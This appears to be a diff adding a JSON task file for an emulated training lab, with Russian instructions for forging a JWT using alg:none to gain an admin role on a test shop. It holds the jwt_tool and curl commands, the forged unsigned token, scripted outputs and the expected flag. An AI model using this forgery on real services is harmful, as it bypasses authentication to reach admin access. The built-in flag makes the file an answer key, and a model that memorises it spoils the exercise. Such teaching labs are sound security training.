@@ -1,0 +1,29 @@
+{
+  "id": "web-tool-jwt-tools",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{jwt_4lg_n0n3_f0rg3d_4dm1n}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: подделка JWT (alg:none)\n\nСессия на `https://shop.acme-lab.test` — это JWT. Мы декодировали его:\n`{\"user\":\"user\",\"role\":\"user\"}`. Цель — подделать `role=admin`.\n\n1. Посмотри содержимое токена (он в файле `token.txt`):\n\n   cat token.txt\n   python3 jwt_tool.py token.txt\n\n2. Проверь, не проверяется ли подпись. Собери токен с `alg:none` и\n   `role=admin`:\n\n   python3 jwt_tool.py token.txt -I -pc role -pv admin -S none\n\n3. Используй подделанный токен на защищённом ресурсе:\n\n   curl -s https://shop.acme-lab.test/admin -H 'Authorization: Bearer <подделанный>' > found.txt\n\n4. Если вернулся Admin panel с флагом — набери `check`.\n" },
+    { "path": "/home/student/task/token.txt", "text": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.9xK3sN4pQ7vB2mR8tL6cW1aZ0yH5dE3fG4jU7iO2kP\n" }
+  ],
+  "tools": {
+    "python3": {
+      "help": "python3 jwt_tool.py <token> [-I -pc role -pv admin -S none] — разбор/подделка JWT",
+      "cases": [
+        { "match": "-S\\s*none|-I\\b|-pc\\s*role", "example": "jwt_tool.py token.txt -I -pc role -pv admin -S none", "output": "\n[*] Forged token (alg=none, null signature):\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9.\n\n[+] New JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9.\n" },
+        { "match": "jwt_tool", "example": "jwt_tool.py token.txt", "output": "\n=====================\nDecoded Token Information\n=====================\n[+] Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n[+] Payload: {\"user\":\"user\",\"role\":\"user\"}\n[+] Signature: 9xK3sN4pQ7vB2mR8tL6cW1aZ0yH5dE3fG4jU7iO2kP\n\n[!] alg is HS256 — try alg:none (-X a) or weak-secret crack\n" }
+      ],
+      "fallback": "python3: в этой лабе эмулируется только jwt_tool.py.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.acme-lab.test/admin)",
+      "cases": [
+        { "match": "Bearer", "example": "-s https://shop.acme-lab.test/admin -H 'Authorization: Bearer eyJhbGciOiJub25lIn0...'", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Admin panel</h1>\n<p>flag: nto{jwt_4lg_n0n3_f0rg3d_4dm1n}</p>\n" },
+        { "match": "admin", "example": "-s https://shop.acme-lab.test/admin", "output": "HTTP/1.1 401 Unauthorized\nContent-Type: text/plain\n\nmissing or invalid token\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.acme-lab.test/admin.\n"
+    }
+  }
+}
